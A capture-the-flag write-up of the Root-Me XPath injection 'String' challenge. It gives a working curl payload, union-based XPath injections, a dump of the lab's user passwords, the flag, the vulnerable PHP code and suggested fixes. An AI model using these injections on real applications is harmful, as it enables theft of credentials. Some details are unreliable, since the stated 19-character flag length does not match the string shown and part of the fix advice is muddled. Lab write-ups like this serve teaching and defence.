# Root-Me — Web-Server: XPath injection - String (ch27) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch27/ ("Forum v0.002", author g0uZ)
**Goal:** Retrieve the administrator's password.

## Flag

```
MB5PRCvfOXiYejMcmNTI
```

(19 characters, byte-verified with `od -c`. Administrator account: **Harry** / `Harry@admin.org`.)

## Exploit

The member search is XPath-injectable. Break out of the string literal and union in the
password node:

```bash
B=http://challenge01.root-me.org/web-serveur/ch27

curl -s -G "$B/" \
  --data-urlencode "action=members" \
  --data-urlencode 'search=NOPE'"'"')] | //user[username="Harry"]/password | //user/username[contains(., '"'"'ZZZZ'
```

Response: `1 results MB5PRCvfOXiYejMcmNTI`

The full expression the server evaluates:

```xpath
//user/username[contains(., 'NOPE')] | //user[username="Harry"]/password | //user/username[contains(., 'ZZZZ')]
```

Two terms match nothing (the decoys) and the middle term selects the admin's password, which
the app then echoes as if it were a username.

## Step by step

### 1. Find the injection point
The site has three actions: Home, Members, Login. `?action=members` renders a search form:

```html
<form action='' method='get'>
  <input type='hidden' name='action' value='members'/>
  <input size='50' type='text' name='search' value=''/>
  <input type='submit' value='search'/>
</form>
```

### 2. Get the query handed to you
Submitting a single quote breaks the XPath and the app prints the **entire expression**:

```
Warning : SimpleXMLElement::xpath(): Invalid expression in /challenge/web-serveur/ch27/index.php on line 28
Error during search, invalid XPath syntax : //user/username[contains(., ''')]
```

That single line gives the injection template, the field names, the file and the line number:

```xpath
//user/username[contains(., '<INPUT>')]
```

The result count in the page (`N results`) is the oracle — no blind guessing needed.

### 3. Dump the whole document
Replace the predicate with a union of `//*` to exfiltrate every node in one request:

```xpath
//user/username[contains(., '')] | //* | //user/username[contains(., '')]
```

```
1 Bob    123456dsrtg          bob@sponge.com    subscriber
2 Harry  MB5PRCvfOXiYejMcmNTI administrator     Harry@admin.org
3 Alex   ezlolsdf             alex@company.biz  subscriber
4 Maxim  346DFE364            max@imum.net      subscriber
5 Lory   jsehrf6325           lory@tomcat.net   subscriber
```

The administrator is **Harry**. Note the field order per `<user>`: id, username, password,
role, email.

### 4. Extract cleanly, with controls

| Injected XPath | Results | Reading |
|---|---|---|
| `//user[username="Harry"]/password` | `1 results MB5PRCvfOXiYejMcmNTI` | **the admin password** |
| `//user[username="Bob"]/password` | `1 results 123456dsrtg` | technique works generally |
| `//user[username="Nobody"]/password` | `0 results` | the oracle can actually say "no" |
| `//user[status="administrator"]/password` | `0 results` | role element has another name |

The "Nobody" row is the important control: it shows a zero-result response is genuinely a
negative, not a failure mode being misread as one. (I did not identify the role element's name
— `role`, `privilege`, `status`, `group`, `type`, `level`, `rank`, `rights`, `permission` and
`usertype` all returned 0 — but it is unnecessary once you have the username.)

### Also present (not needed here)
The **login form** (`?action=login`, POST `username`/`password`) is backed by the same kind of
XPath query, which is what the companion challenge *XPath injection - Authentication* (ch26)
targets. Here the search endpoint alone is enough.

## Root cause

The search term is concatenated straight into an XPath expression:

```php
$xml = simplexml_load_file('users.xml');
$res = $xml->xpath("//user/username[contains(., '" . $_GET['search'] . "')]");
foreach ($res as $u) echo $u;
```

XPath has **no concept of parameter binding**, and its string literals are just as breakable as
SQL's — a single quote ends the literal and the rest of the expression becomes attacker
controlled. This is CWE-643 (Improper Neutralization of Data within XPath Expressions).

Two aggravating details made this trivial:

1. **The error message leaked the whole query** (and the file/line). That turned a blind
   injection into a fully in-band one.
2. **The result set is echoed**, so a union selecting `password` nodes renders them exactly
   like usernames.

## Fix

- **Do not build XPath by concatenation.** Use a parameterised query with variables
  (`DOMXPath::query` + `DOMXPath::registerPhpFunctions` is *not* a fix; the correct pattern is
  to precompile with `DOMXPath::evaluate` and bind a variable via `registerNamespace`/XSLT
  params, or better, stop using user input as an expression entirely).
- **In practice: filter on a fixed set of fields.** Select the user, then compare in PHP:
  ```php
  foreach ($xml->user as $u) {
      if (mb_stripos((string)$u->username, $search) !== false) { echo $u->username; }
  }
  ```
  The search term then never enters the XPath expression.
- **Escape if you must concatenate** — for XPath string literals, split on the quote:
  `concat('a', "'", 'b')`. This is fiddly and easy to get wrong; prefer the previous option.
- **Turn off `display_errors` in production.** The leaked XPath expression is what made this
  challenge easy; without it the same bug is a slow blind extraction.
- **Never echo nodes that the user did not ask for.** Returning only `username` would have
  limited the union to usernames.
